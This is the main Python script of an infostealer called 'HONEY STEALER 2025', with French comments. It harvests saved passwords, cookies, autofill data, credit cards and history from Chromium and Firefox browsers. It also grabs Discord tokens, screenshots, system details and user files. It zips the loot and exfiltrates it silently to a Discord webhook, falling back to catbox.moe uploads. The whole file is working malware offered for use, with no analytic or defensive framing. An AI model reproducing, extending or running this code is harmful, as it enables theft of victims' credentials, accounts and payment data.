# main.py – HONEY STEALER 2025 – ZIP PURS SEULEMENT (0 texte, 0 trace)
import os
import getpass
import requests

import threading
import time
from dumper import DataDumper
from config import WEBHOOK_URL, CHROMIUM_BROWSERS
from chromium import (
    get_existing_profiles,
    extract_chromium_passwords,
    extract_chromium_autofill,
    extract_chromium_cookies,
    extract_chromium_history
)
from firefox import (
    extract_firefox_passwords,
    extract_firefox_formhistory,
    extract_firefox_addresses,
    extract_firefox_creditcards,
    extract_firefox_history,
    extract_firefox_cookies
)
from system import get_system_full, get_screens
from discord import DiscordTokenGrabber
from files import steal_files


# =============================================
# ENVOI ZIP DIRECT DISCORD – 100% SILENCIEUX (juste le fichier, rien d'autre)
# =============================================
def send_direct(zip_path: str):
    if not zip_path or not os.path.exists(zip_path):
        return False
    if os.path.getsize(zip_path) >= 8 * 1024 * 1024:  # Limite Discord gratuit
        return False
    try:
        with open(zip_path, "rb") as f:
            requests.post(
                WEBHOOK_URL,
                data={"content": ""},  # AUCUN message
                files={"file": (os.path.basename(zip_path), f)},
                timeout=180
            )
        size_mb = os.path.getsize(zip_path) / (1024 * 1024)
        return True
    except Exception as e:
        return False


# =============================================
# UPLOAD CATBOX (fallback si > 25 Mo)
# =============================================
def upload_catbox(zip_path: str):
    if not zip_path or not os.path.exists(zip_path):
        return None
    try:
        with open(zip_path, "rb") as f:
            r = requests.post(
                "https://catbox.moe/user/api.php",
                data={"reqtype": "fileupload"},
                files={"fileToUpload": f},
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=400
            )
        if r.status_code == 200 and "catbox.moe" in r.text:
            return r.text.strip()
    except:
        pass
    return None


# =============================================
# WEBHOOK SIMPLE (seulement pour les liens Catbox)
# =============================================
def send_webhook(content: str):
    try:
        requests.post(WEBHOOK_URL, json={"content": content}, timeout=10)
    except:
        pass


# =============================================
# MAIN – VERSION FINALE 2025 (ZIP SEULEMENT)
# =============================================
def main():
    pwd = None
    dumper = DataDumper(zip_output=True, password=pwd)

    try:

        # === 1. Vol des données sensibles ===
        for browser in CHROMIUM_BROWSERS:
            base = os.path.expandvars(browser["base"])
            profiles = get_existing_profiles(base) or [""]
            for profile in profiles:
                extract_chromium_passwords(browser, profile, dumper)
                extract_chromium_autofill(browser, profile, dumper)
                extract_chromium_cookies(browser, profile, dumper)
                extract_chromium_history(browser, profile, dumper)

        extract_firefox_passwords(dumper)
        extract_firefox_formhistory(dumper)
        extract_firefox_addresses(dumper)
        extract_firefox_creditcards(dumper)
        extract_firefox_history(dumper)
        extract_firefox_cookies(dumper)
        get_system_full(dumper)
        get_screens(dumper)

        grabber = DiscordTokenGrabber(dumper)
        grabber.run()  # envoie déjà l'embed avec ID + token

        # === 2. File grabber en fond ===
        thread = threading.Thread(target=steal_files, args=(dumper,), daemon=False)
        thread.start()
        time.sleep(15)
        thread.join(timeout=180)
        if thread.is_alive():
            time.sleep(30)

        # === 3. Création des ZIP ===
        light_zip = dumper.compress(exclude_folder="Files")  # Sans fichiers lourds
        full_zip  = dumper.compress()                         # Avec tout

        # === 4. Envoi silencieux (seulement les ZIP) ===
        if light_zip:
            if not send_direct(light_zip):
                link = upload_catbox(light_zip)
                if link:
                    send_webhook(link)

        if full_zip:
            if not send_direct(full_zip):
                link = upload_catbox(full_zip)
                if link:
                    send_webhook(link)

    except Exception as e:
        send_webhook(f"[ERREUR] {str(e)}")

    finally:
        time.sleep(3)
        dumper.cleanup()


if __name__ == "__main__":
    main()

